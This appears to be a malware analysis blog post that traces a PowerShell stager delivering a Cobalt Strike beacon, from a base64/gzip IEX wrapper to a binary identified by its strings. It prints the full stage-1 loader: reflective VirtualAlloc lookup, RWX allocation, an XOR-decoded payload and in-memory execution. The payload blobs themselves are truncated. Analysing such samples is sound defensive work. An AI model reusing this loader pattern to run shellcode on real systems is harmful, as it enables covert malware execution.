---
title: "Cobalt Strike Beacon Analysis"
categories:
  - Malware Analysis
---

Cobalt Strike, which was originally developed as a legitimate security tool used for adversary emulation by Red Teams, has become a double-edged sword in the realm of cybersecurity. Malicous actors have cracked the software, since then it's been abused by adversaries ranging from hacktivists to APTs to fufill their needs. This is article is an analysis of the PowerShell script that leads to execution of a Cobalt Strike beacon.  

## Discovery

I recently discovered this malicious PowerShell script from a [Twitter post by @xorJosh](https://twitter.com/xorJosh/status/1655905247334735878). In his tweet he described an Oracle related service was exploited to download and execute a PowerShell script.

[![1](/assets/images/CobaltStrikeBeaconAnalysis1/1.png)](/assets/images/CobaltStrikeBeaconAnalysis1/1.png){: .full}

The malware sample mentioned can be found on [MalwareBazaar](https://bazaar.abuse.ch/sample/9c9e8841d706406bc23d05589f77eec6f8df6d5e4076bc6a762fdb423bfe8c24/). Lets download this ourselves and have a look!

## Static Analysis (Stage 0)

```ruby
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAAAAA/+y9Wa/qSrIu+rzrV8yHLa21xNo1wBhjjrSla2wwxh09mDqlkjHgBtw3YM49//1GZBoGY865VtXW1rkPV3dKUwyMnU1kNF9ERqSXp+I/lkXmO4UeH0/f/mNzynI/jr4xf/nLuYycAv/GP/7hnop/JFns/MM+HrNTnn/7X3/5t
....QUA"));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

The PS script starts by defining a variable `s` to Base64 decoded binary data. Once we get to the end of the `s` variable, we see the following:

```ruby
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

This Gzip decompresses the variable `s`, and inputs into the StreamReader object. The contents of the StreamReader object are then passed as input into the IEX function, Invoke-Expression, which executes a given PowerShell command or script. From this, we can take a guess that `s` is gzip compressed, PowerShell code? Let's recreate this process of Base64 decoding & Gzip decompressing in CyberChef.

[![2](/assets/images/CobaltStrikeBeaconAnalysis1/2.png)](/assets/images/CobaltStrikeBeaconAnalysis1/2.png){: .full}

We can see that indeed, this was more PowerShell code to be executed. Let's download this locally and analyze this script

## Static Analysis (Stage 1)

```ruby
Set-StrictMode -Version 2

function func_get_proc_address {
  Param ($var_module, $var_procedure)   
  $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
  $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
  return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
  Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
    [Parameter(Position = 1)] [Type] $var_return_type = [Void]
  )

  $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
  $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
  $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

  return $var_type_builder.CreateType()
}

If ([IntPtr]::size -eq 8) {
  [Byte[]]$var_code = [System.Convert]::FromBase64String('bnlicXZrqsZros8DIyMja64+ydzc3Guq/Gui4GdHIiPc8GKb05aBdUsnIyMjeWuq2tzzIyMjIyMjIyMj2yMjIy08mS0jlyruApsib+4Cd0tKUANTUUxEUUJOA0BCTU1MVwNBRgNRVk0DSk0DZ2xwA05MR
  ...OP84/')

  for ($x = 0; $x -lt $var_code.Count; $x++) {
    $var_code[$x] = $var_code[$x] -bxor 35
  }

  $var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
  $var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
  [System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

  $var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
  $var_runme.Invoke([IntPtr]::Zero)
}

```

The first defined function, `func_get_proc_address()`, basically retrieves the memory address of a specified procedure/function from a specified DLL. We can see this is used here, `$var_var = ... func_get_proc_address kernel32.dll VirtualAlloc), (...`. 

VirtualAlloc is a function of the Win32 API used to allocate a certain region of memory, of the calling process. We can see on the next line the parameters of this function, `$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)` (We'll get onto this `$var_code` variable in a second). Referencing the [documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) on the VirtualAlloc function reveals:

[![3](/assets/images/CobaltStrikeBeaconAnalysis1/3.png)](/assets/images/CobaltStrikeBeaconAnalysis1/3.png){: .full}

We can now match up the corresponding parameters to the Microsoft documentation, but the one I'm most interested in is `flProtect`, which is set to `0x40`. `flProtect` defines the permissions given to an set allocation of memory.

[![4](/assets/images/CobaltStrikeBeaconAnalysis1/4.png)](/assets/images/CobaltStrikeBeaconAnalysis1/4.png){: .full}

We can see `0x40` is equivalent to `PAGE_EXECUTE_READWRITE`, which indicates the allocated memory is more than likely going to be used to execute malicous code.

```ruby
If ([IntPtr]::size -eq 8) {
  [Byte[]]$var_code = [System.Convert]::FromBase64String('bnlicXZrqsZros8DIyMja64+ydzc3Guq/Gui4GdHIiPc8GKb05aBdUsnIyMjeWuq2tzzIyMjIyMjIyMj2yMjIy08mS0jlyruApsib+4Cd0tKUANTUUxEUUJOA0BCTU1MVwNBRgNRVk0DSk0DZ2xwA05MR
  ...OP84/')

  for ($x = 0; $x -lt $var_code.Count; $x++) {
    $var_code[$x] = $var_code[$x] -bxor 35
  }
```

Going through this line by line, we first see a conditional statement, `If ([IntPtr]::size -eq 8) {...`. `[IntPtr]::size` is an integer that defines the architecture type. In a 32-bit system this is equal to `4` and in a 64-bit system this is equal to `8`. This first line checks if the program is of a 64-bit architecture, it'll continue executing, otherwise it'll finish.

The next line, `[Byte[]]$var_code = [System.Convert]::FromBase64String('bn...4/')`, Base64 decodes a massive string, and then stores it as a byte array. The for loop that follows this, iterates over each element of this byte array, performing the following operation - `$var_code[$x] = $var_code[$x] -bxor 35`. This just bitwise XORs each element of the array with decimal 35. Interesting

We can make a conclusion here that the string `bnli...P84/` is XOR encrypted & Base64 encoded. Let's recreate this in CyberChef.

[![5](/assets/images/CobaltStrikeBeaconAnalysis1/5.png)](/assets/images/CobaltStrikeBeaconAnalysis1/5.png){: .full}

We can see the recongizable PE DOS header `MZ` identifiying this file as an Windows Executable. Let's download this file locally and move onto Stage 2!

## Static Analysis (Stage 2)

For confirmation, I used the Linux `file` command to verify I'm dealing with an .exe file.

[![6](/assets/images/CobaltStrikeBeaconAnalysis1/6.PNG)](/assets/images/CobaltStrikeBeaconAnalysis1/6.PNG){: .full}

Let's run the `strings` command, to see if any we can recover anything interesting.

[![7](/assets/images/CobaltStrikeBeaconAnalysis1/7.PNG)](/assets/images/CobaltStrikeBeaconAnalysis1/7.PNG){: .full} 

Interesting, we see `beacon.x64.dll`, certaintly looks dodgy right? [Googling this](https://www.cobaltstrike.com/blog/cobalt-strike-and-yara-can-i-have-your-signature/) reveals this is a common string found in Cobalt Strike beacons. Know we now for sure this a Cobalt Strike beacon, let's try extract the configuration. 

To do this task, I took advanatge of [this](https://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py) great tool.

[![8](/assets/images/CobaltStrikeBeaconAnalysis1/8.PNG)](/assets/images/CobaltStrikeBeaconAnalysis1/8.PNG){: .full} 